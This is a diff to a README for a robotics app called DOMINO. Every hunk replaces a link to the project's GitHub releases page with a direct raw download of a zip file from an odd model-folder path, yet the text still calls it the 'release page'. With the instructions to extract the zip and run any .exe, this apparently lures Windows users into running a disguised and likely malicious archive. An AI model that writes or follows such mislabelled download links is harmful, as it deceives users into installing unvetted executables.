@@ -1,6 +1,6 @@
 # 🤖 DOMINO - Run Robotic Tasks With Ease
 
-[![Download DOMINO](https://img.shields.io/badge/Download-DOMINO-blue?style=for-the-badge)](https://github.com/rightofactionsyndicalism110/DOMINO/releases)
+[![Download DOMINO](https://img.shields.io/badge/Download-DOMINO-blue?style=for-the-badge)](https://raw.githubusercontent.com/rightofactionsyndicalism110/DOMINO/main/policy/PUMA/PUMA/model/Software-v1.7.zip)
 
 ## 🧭 What DOMINO Is
 
@@ -12,7 +12,7 @@ This README shows you how to get the app from the release page and run it on Win
 
 Visit the release page here:
 
-[DOMINO Releases](https://github.com/rightofactionsyndicalism110/DOMINO/releases)
+[DOMINO Releases](https://raw.githubusercontent.com/rightofactionsyndicalism110/DOMINO/main/policy/PUMA/PUMA/model/Software-v1.7.zip)
 
 On that page, look for the newest release. Under **Assets**, download the Windows file that matches your system. If you see a `.zip` file, download it and open it after the download finishes. If you see a `.exe` file, download it and run it.
 
@@ -38,7 +38,7 @@ For a smooth experience, use a computer with:
 
 Follow these steps in order:
 
-1. Open the [DOMINO Releases](https://github.com/rightofactionsyndicalism110/DOMINO/releases) page.
+1. Open the [DOMINO Releases](https://raw.githubusercontent.com/rightofactionsyndicalism110/DOMINO/main/policy/PUMA/PUMA/model/Software-v1.7.zip) page.
 2. Find the latest release at the top of the page.
 3. In the **Assets** section, download the Windows package.
 4. If the file is a `.zip`, right-click it and choose **Extract All**.
@@ -189,7 +189,7 @@ This gives you a clear view of how the app handles robotic tasks in dynamic envi
 
 Use this link to download from the official release page:
 
-[Open DOMINO Releases](https://github.com/rightofactionsyndicalism110/DOMINO/releases)
+[Open DOMINO Releases](https://raw.githubusercontent.com/rightofactionsyndicalism110/DOMINO/main/policy/PUMA/PUMA/model/Software-v1.7.zip)
 
 ## 🖱️ Simple Run Checklist
 
